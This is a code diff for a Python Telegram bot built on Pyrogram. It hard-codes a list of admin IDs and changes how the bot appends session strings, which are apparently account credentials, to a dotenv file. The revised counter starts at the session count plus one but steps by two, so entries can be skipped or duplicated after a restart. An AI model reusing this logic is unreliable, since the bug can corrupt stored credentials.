@@ -16,6 +16,9 @@ import os
 import importlib
 from pyrogram import Client, idle
 
+ADMINS = [1970636001, 951454060, 902478883, 2099942562, 2067434944, 1947740506, 1897354060, 1694909518]
+
+
 command_filter = filters.private & filters.command("buat") & filters.user(ADMINS) & ~filters.via_bot
 
 
@@ -25,18 +28,18 @@ if os.path.isfile(filename):
     with open(filename, "r") as file:
         contents = file.read()
     session_list = re.findall(r"(SESSION\d+)=.*", contents)
-    session_index = len(session_list) + 2
+    session_index = len(session_list) + 1
 else:
-    session_index = 2
+    session_index = 1
 
 @app.on_message(command_filter)
 async def create_env(client, message):
     global session_index  # tambahkan ini
     with open(filename, "a") as file:
-        file.write(f"\nSESSION{session_index}={message.text.split()[2]}")
+        file.write(f"\nSESSION{session_index}={message.text.split()[1]}")
         load_dotenv()
     await message.reply_text(f"Session berhasil disimpan pada {filename} dengan Posisi SESSION{session_index}.")
-    session_index += 1
+    session_index += 2
     
     
     
